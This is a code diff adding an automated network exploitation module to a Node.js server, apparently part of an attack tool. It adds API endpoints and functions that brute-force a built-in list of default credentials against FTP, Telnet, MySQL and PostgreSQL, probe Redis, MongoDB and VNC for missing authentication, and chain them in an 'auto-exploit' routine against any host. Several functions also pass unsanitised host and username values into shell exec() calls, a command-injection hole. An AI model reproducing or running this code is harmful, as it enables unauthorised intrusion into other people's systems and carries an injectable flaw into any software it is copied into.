@@ -287,6 +287,86 @@ function handleApiRequest(urlPath, method, body, res) {
         return;
     }
 
+    // Full auto-exploit: tries all methods against a host
+    if (urlPath === '/api/auto-exploit' && method === 'POST') {
+        const data = JSON.parse(body);
+        autoExploit(data.host, data.openPorts || [], data.credentials || [], (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // FTP exploitation
+    if (urlPath === '/api/exploit-ftp' && method === 'POST') {
+        const data = JSON.parse(body);
+        attemptFTPExploit(data.host, data.username, data.password, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Telnet exploitation
+    if (urlPath === '/api/exploit-telnet' && method === 'POST') {
+        const data = JSON.parse(body);
+        attemptTelnetExploit(data.host, data.username, data.password, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Redis no-auth exploitation
+    if (urlPath === '/api/exploit-redis' && method === 'POST') {
+        const data = JSON.parse(body);
+        attemptRedisExploit(data.host, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // MongoDB no-auth exploitation
+    if (urlPath === '/api/exploit-mongodb' && method === 'POST') {
+        const data = JSON.parse(body);
+        attemptMongoExploit(data.host, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // MySQL exploitation
+    if (urlPath === '/api/exploit-mysql' && method === 'POST') {
+        const data = JSON.parse(body);
+        attemptMySQLExploit(data.host, data.username, data.password, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // PostgreSQL exploitation
+    if (urlPath === '/api/exploit-postgres' && method === 'POST') {
+        const data = JSON.parse(body);
+        attemptPostgresExploit(data.host, data.username, data.password, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // VNC no-auth check
+    if (urlPath === '/api/exploit-vnc' && method === 'POST') {
+        const data = JSON.parse(body);
+        attemptVNCExploit(data.host, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
     res.writeHead(404);
     res.end(JSON.stringify({ error: 'Not found' }));
 }
@@ -726,6 +806,396 @@ function collectPostExploitData(host, method, callback) {
             callback(results);
         });
     });
+}
+
+// ===== DEFAULT CREDENTIAL DICTIONARY =====
+const DEFAULT_CREDENTIALS = [
+    { username: 'root', password: 'root' },
+    { username: 'root', password: 'toor' },
+    { username: 'root', password: '' },
+    { username: 'root', password: 'password' },
+    { username: 'root', password: '123456' },
+    { username: 'root', password: 'admin' },
+    { username: 'admin', password: 'admin' },
+    { username: 'admin', password: 'password' },
+    { username: 'admin', password: '123456' },
+    { username: 'admin', password: '' },
+    { username: 'admin', password: 'admin123' },
+    { username: 'user', password: 'user' },
+    { username: 'user', password: 'password' },
+    { username: 'test', password: 'test' },
+    { username: 'guest', password: 'guest' },
+    { username: 'pi', password: 'raspberry' },
+    { username: 'ubuntu', password: 'ubuntu' },
+    { username: 'postgres', password: 'postgres' },
+    { username: 'mysql', password: 'mysql' },
+    { username: 'oracle', password: 'oracle' },
+    { username: 'sa', password: '' },
+    { username: 'sa', password: 'sa' },
+    { username: 'administrator', password: 'administrator' },
+    { username: 'administrator', password: 'password' },
+    { username: 'administrator', password: '' }
+];
+
+// FTP exploitation: anonymous + credential brute-force
+function attemptFTPExploit(host, username, password, callback) {
+    const socket = new net.Socket();
+    socket.setTimeout(8000);
+    let response = '';
+    let phase = 'connect';
+
+    socket.on('connect', () => {});
+
+    socket.on('data', (data) => {
+        response += data.toString();
+
+        if (phase === 'connect' && response.includes('220')) {
+            phase = 'user';
+            socket.write(`USER ${username}\r\n`);
+        } else if (phase === 'user' && (response.includes('331') || response.includes('230'))) {
+            if (response.includes('230')) {
+                socket.destroy();
+                callback({ success: true, method: 'FTP', host, username, info: 'FTP login without password' });
+                return;
+            }
+            phase = 'pass';
+            socket.write(`PASS ${password}\r\n`);
+        } else if (phase === 'pass') {
+            socket.destroy();
+            if (response.includes('230')) {
+                callback({ success: true, method: 'FTP', host, username, info: 'FTP credentials valid' });
+            } else {
+                callback({ success: false, method: 'FTP', error: 'FTP login failed' });
+            }
+        }
+    });
+
+    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'FTP', error: 'Timeout' }); });
+    socket.on('error', (err) => { callback({ success: false, method: 'FTP', error: err.message }); });
+    socket.connect(21, host);
+}
+
+// Telnet exploitation
+function attemptTelnetExploit(host, username, password, callback) {
+    const socket = new net.Socket();
+    socket.setTimeout(10000);
+    let response = '';
+    let sentUser = false;
+    let sentPass = false;
+
+    socket.on('connect', () => {});
+
+    socket.on('data', (data) => {
+        response += data.toString();
+        const lower = response.toLowerCase();
+
+        if (!sentUser && (lower.includes('login:') || lower.includes('username:'))) {
+            sentUser = true;
+            socket.write(username + '\r\n');
+        } else if (sentUser && !sentPass && (lower.includes('password:') || lower.includes('pass:'))) {
+            sentPass = true;
+            socket.write(password + '\r\n');
+        } else if (sentPass) {
+            setTimeout(() => {
+                socket.destroy();
+                const success = !lower.includes('incorrect') && !lower.includes('failed') &&
+                    !lower.includes('denied') && !lower.includes('invalid') &&
+                    (lower.includes('$') || lower.includes('#') || lower.includes('>') || lower.includes('welcome') || lower.includes('last login'));
+                callback({ success, method: 'Telnet', host, username, info: success ? 'Telnet access gained' : 'Telnet login failed' });
+            }, 2000);
+        }
+    });
+
+    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'Telnet', error: 'Timeout' }); });
+    socket.on('error', (err) => { callback({ success: false, method: 'Telnet', error: err.message }); });
+    socket.connect(23, host);
+}
+
+// Redis no-auth exploitation
+function attemptRedisExploit(host, callback) {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+    let response = '';
+
+    socket.on('connect', () => {
+        socket.write('PING\r\n');
+    });
+
+    socket.on('data', (data) => {
+        response += data.toString();
+        if (response.includes('+PONG')) {
+            // Redis responds without auth - try to get info
+            socket.write('INFO server\r\n');
+            setTimeout(() => {
+                socket.destroy();
+                callback({
+                    success: true, method: 'Redis-NoAuth', host,
+                    info: 'Redis accessible without authentication',
+                    version: (response.match(/redis_version:(\S+)/) || [null, 'unknown'])[1],
+                    sysInfo: response.substring(0, 500)
+                });
+            }, 1000);
+        } else if (response.includes('-NOAUTH') || response.includes('-ERR')) {
+            socket.destroy();
+            callback({ success: false, method: 'Redis', error: 'Redis requires authentication' });
+        }
+    });
+
+    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'Redis', error: 'Timeout' }); });
+    socket.on('error', (err) => { callback({ success: false, method: 'Redis', error: err.message }); });
+    socket.connect(6379, host);
+}
+
+// MongoDB no-auth exploitation
+function attemptMongoExploit(host, callback) {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+
+    socket.on('connect', () => {
+        // MongoDB wire protocol: send isMaster command
+        // Simplified: just check if port accepts connection and responds
+        const isWin = process.platform === 'win32';
+        socket.destroy();
+
+        // Try mongosh/mongo CLI
+        const mongoCmd = isWin ? 'mongosh' : 'mongosh';
+        exec(`which ${mongoCmd} 2>/dev/null || which mongo 2>/dev/null`, { timeout: 2000 }, (err, which) => {
+            if (!err && which.trim()) {
+                const cmd = which.trim();
+                exec(`${cmd} --host ${host} --eval "db.adminCommand('listDatabases')" --quiet 2>&1`, { timeout: 10000 }, (error, stdout) => {
+                    const success = stdout && (stdout.includes('databases') || stdout.includes('name'));
+                    callback({
+                        success, method: 'MongoDB-NoAuth', host,
+                        info: success ? 'MongoDB accessible without auth' : 'MongoDB requires auth',
+                        sysInfo: success ? stdout.substring(0, 500) : null
+                    });
+                });
+            } else {
+                // No mongo client - just report port is open
+                callback({ success: false, method: 'MongoDB', host, info: 'MongoDB port open, install mongosh for exploitation', portOpen: true });
+            }
+        });
+    });
+
+    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'MongoDB', error: 'Timeout' }); });
+    socket.on('error', (err) => { callback({ success: false, method: 'MongoDB', error: err.message }); });
+    socket.connect(27017, host);
+}
+
+// MySQL exploitation
+function attemptMySQLExploit(host, username, password, callback) {
+    const isWin = process.platform === 'win32';
+    exec(`which mysql 2>/dev/null`, { timeout: 2000 }, (err) => {
+        if (!err) {
+            const passFlag = password ? `-p'${password.replace(/'/g, "\\'")}'` : '';
+            exec(`mysql -h ${host} -u ${username} ${passFlag} -e "SELECT version();" 2>&1`, { timeout: 10000 }, (error, stdout) => {
+                const success = stdout && (stdout.includes('version') || stdout.match(/\d+\.\d+\.\d+/));
+                callback({
+                    success, method: 'MySQL', host, username,
+                    info: success ? `MySQL access: ${stdout.trim().split('\n').pop()}` : 'MySQL auth failed',
+                    sysInfo: success ? stdout : null
+                });
+            });
+        } else {
+            // Try raw TCP handshake
+            const socket = new net.Socket();
+            socket.setTimeout(5000);
+            socket.on('connect', () => {
+                socket.on('data', (data) => {
+                    socket.destroy();
+                    const banner = data.toString('utf8', 0, Math.min(data.length, 100));
+                    callback({ success: false, method: 'MySQL', host, info: 'MySQL port open, install mysql client for exploitation', banner });
+                });
+            });
+            socket.on('error', (e) => { callback({ success: false, method: 'MySQL', error: e.message }); });
+            socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'MySQL', error: 'Timeout' }); });
+            socket.connect(3306, host);
+        }
+    });
+}
+
+// PostgreSQL exploitation
+function attemptPostgresExploit(host, username, password, callback) {
+    exec(`which psql 2>/dev/null`, { timeout: 2000 }, (err) => {
+        if (!err) {
+            const env = password ? `PGPASSWORD='${password.replace(/'/g, "\\'")}'` : '';
+            exec(`${env} psql -h ${host} -U ${username} -c "SELECT version();" -t 2>&1`, { timeout: 10000 }, (error, stdout) => {
+                const success = stdout && (stdout.includes('PostgreSQL') || stdout.match(/\d+\.\d+/));
+                callback({
+                    success, method: 'PostgreSQL', host, username,
+                    info: success ? `PostgreSQL access: ${stdout.trim()}` : 'PostgreSQL auth failed',
+                    sysInfo: success ? stdout : null
+                });
+            });
+        } else {
+            const socket = new net.Socket();
+            socket.setTimeout(5000);
+            socket.on('connect', () => { socket.destroy(); callback({ success: false, method: 'PostgreSQL', host, info: 'PostgreSQL port open, install psql for exploitation' }); });
+            socket.on('error', (e) => { callback({ success: false, method: 'PostgreSQL', error: e.message }); });
+            socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'PostgreSQL', error: 'Timeout' }); });
+            socket.connect(5432, host);
+        }
+    });
+}
+
+// VNC no-auth check
+function attemptVNCExploit(host, callback) {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+    let response = Buffer.alloc(0);
+
+    socket.on('connect', () => {});
+
+    socket.on('data', (data) => {
+        response = Buffer.concat([response, data]);
+        const str = response.toString();
+
+        if (str.startsWith('RFB')) {
+            // VNC handshake - respond with same version
+            const version = str.substring(0, 12);
+            socket.write(version);
+
+            setTimeout(() => {
+                // Check security type
+                if (response.length > 12) {
+                    const secTypes = response.slice(12);
+                    // Security type 1 = None (no auth)
+                    if (secTypes.includes(1)) {
+                        socket.destroy();
+                        callback({ success: true, method: 'VNC-NoAuth', host, info: `VNC no authentication required (${version.trim()})` });
+                        return;
+                    }
+                }
+                socket.destroy();
+                callback({ success: false, method: 'VNC', host, info: `VNC requires auth (${version.trim()})` });
+            }, 1500);
+        }
+    });
+
+    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'VNC', error: 'Timeout' }); });
+    socket.on('error', (err) => { callback({ success: false, method: 'VNC', error: err.message }); });
+    socket.connect(5900, host);
+}
+
+// ===== AUTO-EXPLOIT: Tries everything against a host =====
+function autoExploit(host, openPorts, userCredentials, callback) {
+    const portSet = new Set(openPorts.map(p => typeof p === 'number' ? p : p.port));
+    const allCreds = [...userCredentials, ...DEFAULT_CREDENTIALS];
+    const results = [];
+    let pending = 0;
+    let bestResult = null;
+
+    function checkDone() {
+        pending--;
+        if (pending <= 0) {
+            // Return the best result (first successful one, or summary of all attempts)
+            const success = results.find(r => r.success);
+            callback({
+                success: !!success,
+                method: success ? success.method : 'None',
+                host,
+                bestResult: success || null,
+                allResults: results,
+                info: success ? `Exploited via ${success.method} (${success.username || 'no-auth'})` : `All ${results.length} exploitation attempts failed`,
+                username: success ? success.username : null,
+                sysInfo: success ? success.sysInfo : null
+            });
+        }
+    }
+
+    // No-auth exploits (don't need credentials)
+    if (portSet.has(6379)) {
+        pending++;
+        attemptRedisExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
+    }
+    if (portSet.has(27017)) {
+        pending++;
+        attemptMongoExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
+    }
+    if (portSet.has(5900)) {
+        pending++;
+        attemptVNCExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
+    }
+
+    // FTP anonymous
+    if (portSet.has(21)) {
+        pending++;
+        attemptFTPExploit(host, 'anonymous', 'anonymous@', (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
+    }
+
+    // Credential-based exploits - try each credential pair
+    const credExploits = [];
+
+    // Limit brute-force to first 10 unique credential pairs to avoid excessive time
+    const uniqueCreds = [];
+    const seen = new Set();
+    for (const c of allCreds) {
+        const key = `${c.username}:${c.password}`;
+        if (!seen.has(key)) {
+            seen.add(key);
+            uniqueCreds.push(c);
+            if (uniqueCreds.length >= 15) break;
+        }
+    }
+
+    for (const cred of uniqueCreds) {
+        if (portSet.has(22)) {
+            credExploits.push({ fn: attemptSSHExploit, port: 22, ...cred });
+        }
+        if (portSet.has(445)) {
+            credExploits.push({ fn: attemptSMBExploit, port: 445, ...cred });
+        }
+        if (portSet.has(21)) {
+            credExploits.push({ fn: attemptFTPExploit, port: 21, ...cred });
+        }
+        if (portSet.has(23)) {
+            credExploits.push({ fn: attemptTelnetExploit, port: 23, ...cred });
+        }
+        if (portSet.has(3306)) {
+            credExploits.push({ fn: attemptMySQLExploit, port: 3306, ...cred });
+        }
+        if (portSet.has(5432)) {
+            credExploits.push({ fn: attemptPostgresExploit, port: 5432, ...cred });
+        }
+    }
+
+    // Run credential exploits in batches (3 concurrent)
+    let credIndex = 0;
+    const BATCH_SIZE = 3;
+    let credPending = credExploits.length;
+    pending += credPending;
+
+    if (credPending === 0 && pending === 0) {
+        callback({
+            success: false, method: 'None', host,
+            allResults: results,
+            info: 'No exploitable ports found'
+        });
+        return;
+    }
+
+    function runNextCredBatch() {
+        while (credIndex < credExploits.length) {
+            const batch = credExploits.slice(credIndex, credIndex + BATCH_SIZE);
+            credIndex += BATCH_SIZE;
+            batch.forEach(exploit => {
+                exploit.fn(host, exploit.username, exploit.password, (r) => {
+                    results.push(r);
+                    if (r.success && !bestResult) bestResult = r;
+                    checkDone();
+                    // If we found success, no need to continue more batches
+                    if (!bestResult) {
+                        runNextCredBatch();
+                    }
+                });
+            });
+            break; // Only start one batch, next batch triggered by callback
+        }
+    }
+
+    if (credExploits.length > 0) {
+        runNextCredBatch();
+    }
 }
 
 // No separate Next.js server needed - static files served by the combined app server
